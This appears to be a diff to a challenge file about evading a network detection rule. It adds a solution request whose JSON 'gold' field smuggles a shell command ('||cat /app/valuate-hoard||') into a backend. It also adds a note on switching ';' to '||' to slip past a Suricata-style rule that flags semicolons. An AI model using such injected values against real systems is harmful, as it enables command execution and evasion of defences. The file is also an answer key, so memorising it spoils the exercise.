@@ -24,9 +24,24 @@ base_request: |-
     "artifacts": "30"
   }
 
+solution: |-
+  POST /backend.php HTTP/1.1
+  Host: localhost
+  Content-Type: application/json
+  Content-Length: 115
+
+  {
+    "hoardType": "artifact",
+    "gold": "10'||cat /app/valuate-hoard||echo '",
+    "gems": "20",
+    "artifacts": "30"
+  }
+
+solution_note: Changed ';' to '||'
+
 rules:
 
-# Avoid 'json'
+# Avoid ;
 - >
   alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.request_body; content: "\"artifact\""; content: "\;"; sid:123456; rev:1;)
 
